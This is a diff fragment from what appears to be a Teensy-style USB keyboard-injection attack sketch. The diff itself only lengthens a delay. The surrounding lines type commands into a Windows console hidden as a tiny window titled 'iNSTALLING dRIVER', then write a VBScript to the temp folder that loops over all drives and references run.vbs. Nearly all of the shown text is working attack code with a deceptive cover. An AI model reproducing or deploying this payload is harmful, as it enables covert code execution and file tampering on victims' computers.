@@ -68,7 +68,7 @@ void setup() {
    Keyboard.send_now();                                          
    delay(200);                                                  
    Keyboard.println("cmd /T:32 /K \"mode con: cols=16 lines=1&mode con: delay=0&title iNSTALLING dRIVER\"");                                                                   
-   delay(300);
+   delay(1000);
    Keyboard.println("echo Set F=CreateObject(\"Scripting.FileSystemObject\")>%tmp%\\i.vbs");   
    Keyboard.println("echo o=F.getspecialfolder(2)^&\"\\run.vbs\">>%tmp%\\i.vbs");   
    Keyboard.println("echo For Each A in F.Drives>>%tmp%\\i.vbs");   
